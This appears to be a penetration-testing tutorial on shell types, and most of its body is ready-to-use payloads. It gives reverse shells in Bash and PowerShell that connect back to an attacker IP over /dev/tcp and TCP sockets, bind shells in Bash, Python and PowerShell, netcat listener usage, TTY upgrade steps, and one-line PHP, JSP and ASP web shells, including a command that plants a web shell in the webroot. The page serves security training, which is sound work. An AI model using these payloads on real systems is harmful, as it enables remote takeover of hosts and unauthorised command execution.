# Types of Shells

| Shell Type    | Description   |
| ------------- | ------------- |
| Reverse shell | Initiates a connection back to a "listener" on our attack box. |
| Bind shell    | "Binds" to a specific port on the target host and waits for a connection from our attack box. |
| Web shell     | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command.) |

## Reverse Shell

A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port.

### Netcat Listener

```bash
$ nc -lvnp 1234

listening on [any] 1234 ...
```

| Flag | Description |
| ---- | ----------- |
| -l | Listen mode, to wait for a connection to connect to us. |
| -v | Verbose mode, so that we know when we receive a connection.  |
| -n | Disable DNS resolution and only connect from/to IPs, to speed up the connection.  |
| -p 1234 | Port number netcat is listening on, and the reverse connection should be sent to. |

### Connect Back IP

We need an IP to tell the compromised machine to connect to, which is ours:

```bash
$ ip a

...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0

...
```

In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.

### Reverse Shell Command

The [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet) page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.

Bash:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Powershell:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Bind Shell

Another type of shell is a bind shell. Unlike a reverse shell that connects to us, we will have to connect to it on the targets' listening port. If we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately.

However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

### Bind Shell Command

Once again, we can utilize [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet) to find a proper command to start our bind shell.

Bash:

```bash
$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Python:

```bash
$ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Powershell:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

### Netcat Connection

Once the bind shell command is issued, we should have a shell waiting for us to connect to on the compromised host.

```bash
$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Upgrading TTY

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY.

This can be achieved by mapping our terminal TTY with the remote TTY.

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:

```bash
$ ^Z
$ stty raw -echo
$ fg

<Enter>
<Enter>
www-data@remotehost$
```

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```bash
$ echo $TERM
xterm-256color

$ stty size
67 318

$ export TERM=xterm-256color
$ stty rows 67 columns 318
```

## Web Shell

A web shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.

### Writing a Web Shell

PHP:

```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP:

```asp
<% eval request("cmd") %>
```

### Uploading a Web Shell

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser.

The first step is to identify where the webroot is. The following are the default webroots for common web servers:

| Web Server | Default Webroot        |
|------------|------------------------|
| Apache     | /var/www/html/         |
| Nginx      | /usr/local/nginx/html/ |
| IIS        | C:\inetpub\wwwroot\    |
| XAMPP      | C:\xampp\htdocs\       |

```bash
$ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Accessing the Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`.

```bash
$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
